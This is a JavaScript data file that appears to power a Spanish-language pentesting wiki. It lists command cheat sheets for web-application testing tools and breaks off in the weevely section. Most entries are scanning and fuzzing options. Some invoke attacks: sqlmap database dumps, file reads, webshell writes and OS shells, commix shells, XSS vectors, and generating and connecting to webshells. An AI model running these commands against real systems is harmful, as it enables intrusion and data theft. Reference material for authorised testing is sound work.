// Pentesting Web (Web Application)
window.WIKI_CHEATSHEETS_15_WEBAPP = [
 {
  "tool": "burpsuite",
  "desc": "Suite de pentest web (proxy, scanner, intruder)",
  "commands": [
   {
    "cmd": "burpsuite",
    "desc": "Abrir GUI"
   },
   {
    "cmd": "burpsuite --project-file proyecto.prj",
    "desc": "Con proyecto"
   },
   {
    "cmd": "burpsuite --config-file config.json",
    "desc": "Con config"
   },
   {
    "cmd": "burpsuite --unresponsive-is-fatal",
    "desc": "Matar si no responde"
   },
   {
    "cmd": "burpsuite --disable-extensions",
    "desc": "Sin extensiones"
   },
   {
    "cmd": "burpsuite --user-config-file user.json",
    "desc": "Config de usuario"
   },
   {
    "cmd": "burpsuite --auto-repair",
    "desc": "Reparar proyecto"
   },
   {
    "cmd": "java -jar burpsuite_pro.jar --project-file p.prj",
    "desc": "Vía java"
   },
   {
    "cmd": "java -jar burpsuite_pro.jar --unresponsive-is-fatal",
    "desc": "Vía java"
   }
  ]
 },
 {
  "tool": "zaproxy",
  "desc": "OWASP ZAP - scanner de aplicaciones web",
  "commands": [
   {
    "cmd": "zaproxy",
    "desc": "Abrir GUI"
   },
   {
    "cmd": "zaproxy -daemon",
    "desc": "Modo daemon"
   },
   {
    "cmd": "zaproxy -daemon -port 8080",
    "desc": "Daemon en 8080"
   },
   {
    "cmd": "zaproxy -daemon -config api.key=KEY",
    "desc": "Con API key"
   },
   {
    "cmd": "zaproxy -daemon -config proxy.loopbackonly=true",
    "desc": "Solo localhost"
   },
   {
    "cmd": "zaproxy -daemon -session /tmp/sesion",
    "desc": "Sesión"
   },
   {
    "cmd": "zaproxy -daemon -newsession /tmp/nueva",
    "desc": "Nueva sesión"
   },
   {
    "cmd": "zaproxy -daemon -addonupdate",
    "desc": "Actualizar addons"
   },
   {
    "cmd": "zaproxy -daemon -addoninstall ascanrules",
    "desc": "Instalar addon"
   },
   {
    "cmd": "zaproxy -daemon -silent",
    "desc": "Silencioso"
   },
   {
    "cmd": "zaproxy -daemon -config api.addrs.addr.name=*",
    "desc": "API abierta"
   },
   {
    "cmd": "zaproxy -daemon -config api.addrs.addr.regex=true",
    "desc": "Regex API"
   },
   {
    "cmd": "zap-cli quick-scan http://objetivo.com",
    "desc": "Escaneo rápido CLI"
   },
   {
    "cmd": "zap-cli --api-key KEY quick-scan URL",
    "desc": "Con API key"
   },
   {
    "cmd": "zap-cli spider URL",
    "desc": "Spider"
   },
   {
    "cmd": "zap-cli active-scan URL",
    "desc": "Escaneo activo"
   },
   {
    "cmd": "zap-cli alerts URL",
    "desc": "Listar alertas"
   },
   {
    "cmd": "zap-cli open-url URL",
    "desc": "Abrir URL"
   }
  ]
 },
 {
  "tool": "nikto",
  "desc": "Scanner de vulnerabilidades de servidores web",
  "commands": [
   {
    "cmd": "nikto -h http://192.168.1.10",
    "desc": "Escanear host"
   },
   {
    "cmd": "nikto -h https://192.168.1.10",
    "desc": "HTTPS"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -p 8080",
    "desc": "Puerto"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -o reporte.html",
    "desc": "Guardar HTML"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -Format json -o out.json",
    "desc": "Formato JSON"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -Tuning 1",
    "desc": "Solo archivos (tuning)"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -Tuning x",
    "desc": "Excluir categorías"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -evasion 1",
    "desc": "Evasión"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -maxtime 120",
    "desc": "Máximo 120s"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -ssl",
    "desc": "Forzar SSL"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -id user:pass",
    "desc": "Autenticación"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -no404",
    "desc": "Ignorar 404"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -useproxy http://proxy:8080",
    "desc": "Vía proxy"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -update",
    "desc": "Actualizar DB"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -list-plugins",
    "desc": "Listar plugins"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -Plugins apacheusers",
    "desc": "Plugin específico"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -C all",
    "desc": "Todos los CGI"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -mutate 1",
    "desc": "Mutación de URLs"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -useragent 'Custom/1.0'",
    "desc": "User agent"
   },
   {
    "cmd": "nikto -h http://192.168.1.10 -vhost vhost.local",
    "desc": "Virtual host"
   }
  ]
 },
 {
  "tool": "wpscan",
  "desc": "Scanner de WordPress",
  "commands": [
   {
    "cmd": "wpscan --url http://192.168.1.10",
    "desc": "Escanear WordPress"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --enumerate u",
    "desc": "Enumerar usuarios"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --enumerate p",
    "desc": "Enumerar plugins"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --enumerate t",
    "desc": "Enumerar themes"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --enumerate vp",
    "desc": "Vulnerable plugins"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --enumerate u,vp,vt",
    "desc": "Todo"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --passwords wordlist.txt",
    "desc": "Password attack"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --usernames admin",
    "desc": "Un usuario"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --plugins-detection aggressive",
    "desc": "Detección agresiva"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --api-token TOKEN",
    "desc": "Con API token"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 -o out.txt",
    "desc": "Salida a archivo"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --force",
    "desc": "Forzar escaneo"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --random-user-agent",
    "desc": "UA aleatorio"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --proxy http://127.0.0.1:8080",
    "desc": "Vía proxy"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --max-threads 10",
    "desc": "Hilos"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --request-timeout 15",
    "desc": "Timeout"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --exclude-content-based regex",
    "desc": "Excluir"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --headers 'X-A: b'",
    "desc": "Headers custom"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --disable-tls-checks",
    "desc": "Sin TLS checks"
   },
   {
    "cmd": "wpscan --url http://192.168.1.10 --wp-content-dir wp-content",
    "desc": "Directorio custom"
   }
  ]
 },
 {
  "tool": "joomscan",
  "desc": "Scanner de Joomla",
  "commands": [
   {
    "cmd": "joomscan -u http://192.168.1.10",
    "desc": "Escanear"
   },
   {
    "cmd": "joomscan -u http://192.168.1.10 -p",
    "desc": "Verificar proxy"
   },
   {
    "cmd": "joomscan -u http://192.168.1.10 -ec",
    "desc": "Versiones componentes"
   },
   {
    "cmd": "joomscan -u http://192.168.1.10 -r out.txt",
    "desc": "Reporte"
   },
   {
    "cmd": "joomscan -u http://192.168.1.10 -v",
    "desc": "Verbose"
   },
   {
    "cmd": "joomscan -u http://192.168.1.10 -a",
    "desc": "Aggressive"
   },
   {
    "cmd": "joomscan -u http://192.168.1.10 -ep",
    "desc": "Enumerar plugin"
   },
   {
    "cmd": "joomscan -u http://192.168.1.10 -e",
    "desc": "Exploit"
   },
   {
    "cmd": "joomscan -u http://192.168.1.10 -c cookie.txt",
    "desc": "Cookies"
   },
   {
    "cmd": "joomscan -u http://192.168.1.10 -h",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "dirb",
  "desc": "Scanner de directorios web con diccionario",
  "commands": [
   {
    "cmd": "dirb http://192.168.1.10",
    "desc": "Escaneo por defecto"
   },
   {
    "cmd": "dirb http://192.168.1.10 /usr/share/wordlists/dirb/big.txt",
    "desc": "Con wordlist"
   },
   {
    "cmd": "dirb http://192.168.1.10 -r",
    "desc": "No recursivo"
   },
   {
    "cmd": "dirb http://192.168.1.10 -R",
    "desc": "Recursivo con contador"
   },
   {
    "cmd": "dirb http://192.168.1.10 -o out.txt",
    "desc": "Guardar"
   },
   {
    "cmd": "dirb http://192.168.1.10 -X .php,.html",
    "desc": "Extensiones"
   },
   {
    "cmd": "dirb http://192.168.1.10 -x ext.txt",
    "desc": "Extensiones de archivo"
   },
   {
    "cmd": "dirb http://192.168.1.10 -z 100",
    "desc": "Delay 100ms"
   },
   {
    "cmd": "dirb http://192.168.1.10 -c cookie",
    "desc": "Cookies"
   },
   {
    "cmd": "dirb http://192.168.1.10 -u user:pass",
    "desc": "Auth básica"
   },
   {
    "cmd": "dirb http://192.168.1.10 -p http://127.0.0.1:8080",
    "desc": "Vía proxy"
   },
   {
    "cmd": "dirb http://192.168.1.10 -P user:pass",
    "desc": "Proxy auth"
   },
   {
    "cmd": "dirb http://192.168.1.10 -S",
    "desc": "Solo 200s"
   },
   {
    "cmd": "dirb http://192.168.1.10 -w",
    "desc": "Con wordlist warnings"
   },
   {
    "cmd": "dirb http://192.168.1.10 -a 'UA'",
    "desc": "User agent"
   },
   {
    "cmd": "dirb http://192.168.1.10 -H 'X-Forwarded-For: 127.0.0.1'",
    "desc": "Header custom"
   },
   {
    "cmd": "dirb http://192.168.1.10 -l",
    "desc": "Imprimir location"
   },
   {
    "cmd": "dirb http://192.168.1.10 -N 404",
    "desc": "Ignorar 404"
   },
   {
    "cmd": "dirb http://192.168.1.10 -f",
    "desc": "Fine tuning"
   },
   {
    "cmd": "dirb http://192.168.1.10 -t 50",
    "desc": "Threads"
   }
  ]
 },
 {
  "tool": "gobuster",
  "desc": "Fuerza bruta de directorios, vhosts, DNS",
  "commands": [
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt",
    "desc": "Directorios"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt -x php,txt",
    "desc": "Extensiones"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt -t 100",
    "desc": "100 hilos"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt -o out.txt",
    "desc": "Guardar"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt -k",
    "desc": "Ignorar SSL"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt -s '200,204,301'",
    "desc": "Solo status"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt -b 403",
    "desc": "Excluir status"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt -c 'SESSION=abc'",
    "desc": "Cookies"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt -H 'X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt -U user -P pass",
    "desc": "Auth"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt -p proxy",
    "desc": "Proxy"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt --delay 1s",
    "desc": "Delay"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt --random-agent",
    "desc": "UA aleatorio"
   },
   {
    "cmd": "gobuster vhost -u http://192.168.1.10 -w vhosts.txt",
    "desc": "Virtual hosts"
   },
   {
    "cmd": "gobuster vhost -u http://192.168.1.10 -w vhosts.txt --append-domain",
    "desc": "Con dominio"
   },
   {
    "cmd": "gobuster dns -d objetivo.com -w subdomains.txt",
    "desc": "Subdominios"
   },
   {
    "cmd": "gobuster dns -d objetivo.com -w sub.txt -r 8.8.8.8",
    "desc": "Resolver"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt --no-error",
    "desc": "Sin errores"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt -r",
    "desc": "Seguir redirects"
   },
   {
    "cmd": "gobuster dir -u http://192.168.1.10 -w wordlist.txt -q",
    "desc": "Quiet"
   }
  ]
 },
 {
  "tool": "ffuf",
  "desc": "Fuzzer web rápido (FUZZ keyword)",
  "commands": [
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt",
    "desc": "Fuzzing de directorios"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -mc 200",
    "desc": "Solo 200"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -fc 404",
    "desc": "Excluir 404"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -t 100",
    "desc": "100 hilos"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -o out.json",
    "desc": "Salida JSON"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -r",
    "desc": "Seguir redirects"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -H 'X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -c 'SID=abc'",
    "desc": "Cookies"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -X POST -d 'user=FUZZ'",
    "desc": "POST body"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -b 'flag=FUZZ'",
    "desc": "Burp style"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/ -w headers.txt:H -H 'H: FUZZ'",
    "desc": "Header fuzz"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -e .php,.txt",
    "desc": "Extensiones"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -fw 3",
    "desc": "Excluir palabras"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -fs 0",
    "desc": "Excluir tamaño"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -recursion",
    "desc": "Recursivo"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -maxtime 300",
    "desc": "Timeout"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -p 0.5",
    "desc": "Delay"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -s",
    "desc": "Silent"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -v",
    "desc": "Verbose"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -http2",
    "desc": "HTTP/2"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -x http://proxy:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -timeout 10",
    "desc": "Timeout conn"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -rate 100",
    "desc": "Rate limit"
   },
   {
    "cmd": "ffuf -u http://192.168.1.10/FUZZ -w wordlist.txt -of md -o out.md",
    "desc": "Markdown"
   }
  ]
 },
 {
  "tool": "wfuzz",
  "desc": "Fuzzer web con muchas features",
  "commands": [
   {
    "cmd": "wfuzz -w wordlist.txt http://192.168.1.10/FUZZ",
    "desc": "Fuzzing básico"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ -hc 404",
    "desc": "Esconder 404"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ -hh 123",
    "desc": "Esconder por tamaño"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ -t 50",
    "desc": "50 hilos"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ --hc=404,403",
    "desc": "Varios"
   },
   {
    "cmd": "wfuzz -z range,1-100 -u http://192.168.1.10/FUZZ",
    "desc": "Payload range"
   },
   {
    "cmd": "wfuzz -z file,users.txt -u http://192.168.1.10/FUZZ",
    "desc": "Payload de archivo"
   },
   {
    "cmd": "wfuzz -z list,admin-user-api -u http://192.168.1.10/FUZZ",
    "desc": "Lista"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ -X POST -d 'user=FUZZ'",
    "desc": "POST"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ -b 'sid=x'",
    "desc": "Cookies"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ -H 'X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ -o out.html",
    "desc": "Reporte"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ -f out.txt",
    "desc": "Salida"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ -p 127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ --req http.txt",
    "desc": "Request file"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ -D",
    "desc": "Debug"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ --filter 'code=200'",
    "desc": "Filtro"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ --seq",
    "desc": "Iteración"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ -R 3",
    "desc": "Recursivo"
   },
   {
    "cmd": "wfuzz -w wordlist.txt -u http://192.168.1.10/FUZZ -Z",
    "desc": "Zipped payload"
   }
  ]
 },
 {
  "tool": "feroxbuster",
  "desc": "Fuzzer recursivo de contenido web en Rust",
  "commands": [
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt",
    "desc": "Escaneo"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -x php txt",
    "desc": "Extensiones"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -t 100",
    "desc": "Hilos"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -r",
    "desc": "Seguir redirects"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -k",
    "desc": "Sin SSL verify"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -C 403",
    "desc": "Esconder status"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -S 200",
    "desc": "Solo status"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -o out.json",
    "desc": "Salida"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -Q 0.2",
    "desc": "Delay"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt --no-recursion",
    "desc": "Sin recursión"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt --depth 3",
    "desc": "Profundidad"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -d 3",
    "desc": "Profundidad"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -a 'UA'",
    "desc": "User agent"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -b http://proxy",
    "desc": "Proxy"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -L 5",
    "desc": "Límite 5"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt --auto-bail",
    "desc": "Bail"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt --silent",
    "desc": "Silent"
   },
   {
    "cmd": "feroxbuster -u http://192.168.1.10 -w wordlist.txt -v",
    "desc": "Verbose"
   }
  ]
 },
 {
  "tool": "dirsearch",
  "desc": "Scanner de directorios web avanzado",
  "commands": [
   {
    "cmd": "dirsearch -u http://192.168.1.10",
    "desc": "Escaneo por defecto"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 -w wordlist.txt",
    "desc": "Wordlist"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 -e php,html",
    "desc": "Extensiones"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 -t 50",
    "desc": "Hilos"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 -x 404,403",
    "desc": "Excluir"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 -o out.json",
    "desc": "Salida JSON"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 -r",
    "desc": "Recursivo"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 --deep",
    "desc": "Deep scan"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 -i 200,301",
    "desc": "Incluir"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 -H 'X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 --random-agent",
    "desc": "UA aleatorio"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 --delay 1",
    "desc": "Delay"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 --proxy http://127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 -k",
    "desc": "Sin SSL check"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 -c 'cook=val'",
    "desc": "Cookies"
   },
   {
    "cmd": "dirsearch -u http://192.168.1.10 -q",
    "desc": "Quiet"
   }
  ]
 },
 {
  "tool": "sqlmap",
  "desc": "Automatización de inyecciones SQL",
  "commands": [
   {
    "cmd": "sqlmap -u 'http://192.168.1.10/pagina.php?id=1'",
    "desc": "Test básico"
   },
   {
    "cmd": "sqlmap -u 'http://192.168.1.10/pagina.php?id=1' --dbs",
    "desc": "Listar BD"
   },
   {
    "cmd": "sqlmap -u 'http://192.168.1.10/pagina.php?id=1' -D db --tables",
    "desc": "Listar tablas"
   },
   {
    "cmd": "sqlmap -u 'http://192.168.1.10/pagina.php?id=1' -D db -T table --columns",
    "desc": "Columnas"
   },
   {
    "cmd": "sqlmap -u 'http://192.168.1.10/pagina.php?id=1' -D db -T table -C col --dump",
    "desc": "Dump"
   },
   {
    "cmd": "sqlmap -u 'http://192.168.1.10/pagina.php?id=1' --dump-all",
    "desc": "Dump todo"
   },
   {
    "cmd": "sqlmap -u 'http://192.168.1.10/pagina.php?id=1' --os-shell",
    "desc": "Shell del sistema"
   },
   {
    "cmd": "sqlmap -u 'http://192.168.1.10/pagina.php?id=1' --os-pwn",
    "desc": "Meterpreter"
   },
   {
    "cmd": "sqlmap -u 'http://192.168.1.10/login.php' --data='user=admin&pass=123'",
    "desc": "POST"
   },
   {
    "cmd": "sqlmap -u URL --cookie='PHPSESSID=abc'",
    "desc": "Con cookies"
   },
   {
    "cmd": "sqlmap -u URL --level=5 --risk=3",
    "desc": "Máximo nivel"
   },
   {
    "cmd": "sqlmap -u URL --batch",
    "desc": "No interactivo"
   },
   {
    "cmd": "sqlmap -u URL --tamper=space2comment",
    "desc": "Tamper"
   },
   {
    "cmd": "sqlmap -u URL --proxy=http://127.0.0.1:8080",
    "desc": "Vía proxy"
   },
   {
    "cmd": "sqlmap -u URL --threads 5",
    "desc": "Hilos"
   },
   {
    "cmd": "sqlmap -r request.txt",
    "desc": "De archivo de request"
   },
   {
    "cmd": "sqlmap -u URL --technique=BEUSTQ",
    "desc": "Técnicas"
   },
   {
    "cmd": "sqlmap -u URL --dbms=mysql",
    "desc": "DBMS"
   },
   {
    "cmd": "sqlmap -u URL --time-sec=5",
    "desc": "Timeout inyección"
   },
   {
    "cmd": "sqlmap -u URL --is-dba",
    "desc": "¿Es DBA?"
   },
   {
    "cmd": "sqlmap -u URL --current-user",
    "desc": "Usuario actual"
   },
   {
    "cmd": "sqlmap -u URL --passwords",
    "desc": "Passwords"
   },
   {
    "cmd": "sqlmap -u URL --users",
    "desc": "Usuarios"
   },
   {
    "cmd": "sqlmap -u URL --privileges",
    "desc": "Privilegios"
   },
   {
    "cmd": "sqlmap -u URL --file-read=/etc/passwd",
    "desc": "Leer archivo"
   },
   {
    "cmd": "sqlmap -u URL --file-write=shell.php --file-dest=/var/www/html/",
    "desc": "Escribir archivo"
   },
   {
    "cmd": "sqlmap -u URL --forms",
    "desc": "Testear formularios"
   },
   {
    "cmd": "sqlmap -u URL --crawl=3",
    "desc": "Crawl depth 3"
   },
   {
    "cmd": "sqlmap -u URL --check-waf",
    "desc": "Detectar WAF"
   },
   {
    "cmd": "sqlmap -u URL --random-agent",
    "desc": "UA aleatorio"
   },
   {
    "cmd": "sqlmap -u URL --delay=2",
    "desc": "Delay"
   },
   {
    "cmd": "sqlmap -u URL --second-order=URL2",
    "desc": "Second order"
   },
   {
    "cmd": "sqlmap -u URL --safe-url=URL2",
    "desc": "Safe URL"
   },
   {
    "cmd": "sqlmap -u URL --ignore-code=404",
    "desc": "Ignorar 404"
   }
  ]
 },
 {
  "tool": "commix",
  "desc": "Automatización de inyección de comandos",
  "commands": [
   {
    "cmd": "commix --url 'http://192.168.1.10/cmd.php?c=ping'",
    "desc": "Test básico"
   },
   {
    "cmd": "commix --url URL --data='cmd=ping'",
    "desc": "POST"
   },
   {
    "cmd": "commix --url URL --cookie='PHPSESSID=abc'",
    "desc": "Con cookies"
   },
   {
    "cmd": "commix --url URL --level=3",
    "desc": "Nivel"
   },
   {
    "cmd": "commix --url URL --os=linux",
    "desc": "OS"
   },
   {
    "cmd": "commix --url URL --batch",
    "desc": "No interactivo"
   },
   {
    "cmd": "commix --url URL --proxy=http://127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "commix --url URL --technique=all",
    "desc": "Técnicas"
   },
   {
    "cmd": "commix --url URL --os-shell",
    "desc": "Shell"
   },
   {
    "cmd": "commix -r request.txt",
    "desc": "De archivo"
   },
   {
    "cmd": "commix --url URL --headers='X-A: 1'",
    "desc": "Headers"
   },
   {
    "cmd": "commix --url URL --drop-set-cookie",
    "desc": "Drop cookies"
   },
   {
    "cmd": "commix --url URL --ignore-401",
    "desc": "Ignorar 401"
   },
   {
    "cmd": "commix --url URL --delay=2",
    "desc": "Delay"
   },
   {
    "cmd": "commix --url URL --random-agent",
    "desc": "UA aleatorio"
   }
  ]
 },
 {
  "tool": "xsser",
  "desc": "Framework de XSS (detección y explotación)",
  "commands": [
   {
    "cmd": "xsser --url 'http://192.168.1.10/xss.php?q=test'",
    "desc": "Test XSS"
   },
   {
    "cmd": "xsser --url URL --auto",
    "desc": "Modo auto"
   },
   {
    "cmd": "xsser --url URL --cookie='SID=abc'",
    "desc": "Cookies"
   },
   {
    "cmd": "xsser --url URL -s",
    "desc": "SSL"
   },
   {
    "cmd": "xsser --url URL --proxy=http://127.0.0.1:8080",
    "desc": "Proxy"
   },
   {
    "cmd": "xsser --url URL --threads=5",
    "desc": "Hilos"
   },
   {
    "cmd": "xsser --url URL --drop-cookie",
    "desc": "Drop cookie"
   },
   {
    "cmd": "xsser --url URL --get",
    "desc": "GET"
   },
   {
    "cmd": "xsser --url URL --post",
    "desc": "POST"
   },
   {
    "cmd": "xsser --url URL --timer=2",
    "desc": "Timer"
   },
   {
    "cmd": "xsser --url URL --timeout=10",
    "desc": "Timeout"
   },
   {
    "cmd": "xsser --url URL --verbose",
    "desc": "Verbose"
   },
   {
    "cmd": "xsser --url URL --payload 'alert(1)'",
    "desc": "Payload custom"
   },
   {
    "cmd": "xsser --url URL --vector='<script>FUZZ</script>'",
    "desc": "Vector"
   }
  ]
 },
 {
  "tool": "webshells",
  "desc": "Colección de webshells (c99, c100, php, asp, jsp)",
  "commands": [
   {
    "cmd": "webshells --list",
    "desc": "Listar webshells"
   },
   {
    "cmd": "webshells --shell c99.php",
    "desc": "Seleccionar c99"
   },
   {
    "cmd": "webshells --shell r57.php",
    "desc": "Seleccionar r57"
   },
   {
    "cmd": "webshells --shell php-reverse-shell.php",
    "desc": "Reverse shell PHP"
   },
   {
    "cmd": "webshells --shell cmd.asp",
    "desc": "ASP"
   },
   {
    "cmd": "webshells --shell shell.jsp",
    "desc": "JSP"
   },
   {
    "cmd": "webshells --shell b374k.php",
    "desc": "b374k"
   },
   {
    "cmd": "webshells --shell obfuscated.php",
    "desc": "Ofuscada"
   },
   {
    "cmd": "webshells --extract /tmp/shells/",
    "desc": "Extraer todas"
   },
   {
    "cmd": "webshells --help",
    "desc": "Ayuda"
   }
  ]
 },
 {
  "tool": "weevely",
  "desc": "Webshell PHP cifrada (con persistencia)",
  "commands": [
   {
    "cmd": "weevely generate password shell.php",
    "desc": "Generar webshell"
   },
   {
    "cmd": "weevely generate pass /tmp/sh.php",
    "desc": "Guardar en path"
   },
   {
    "cmd": "weevely http://192.168.1.10/shell.php password",
    "desc": "Conectar"
   },
   {
    "cmd": "weevely generate pass shell.php -e",
    "desc": "Con backdoor extra"
   },
   {
    "cmd": "weevely http://IP/shell.php pass --listen",
    "desc": "Modo listener"
   },
   {
    "cmd": "weevely http://IP/shell.php pass --no-command",
